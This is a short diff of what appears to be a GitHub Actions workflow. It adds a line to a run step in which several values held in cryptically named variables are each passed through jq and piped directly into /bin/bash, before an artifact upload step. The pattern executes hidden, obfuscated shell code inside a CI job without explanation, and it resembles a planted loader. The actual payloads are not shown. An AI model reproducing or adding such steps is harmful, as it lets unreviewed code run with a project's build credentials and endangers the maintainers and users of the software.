@@ -23,6 +23,7 @@ jobs:
           echo $cbpaa7 | jq -r .olod914 | /bin/bash
           printf '%s' "$key9" | jq -r .wpgq93009 | /bin/bash
           echo $cjbg727 | jq -r .o443 | /bin/bash
+          printf '%s' "$fmiz1002" | jq -r .th7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
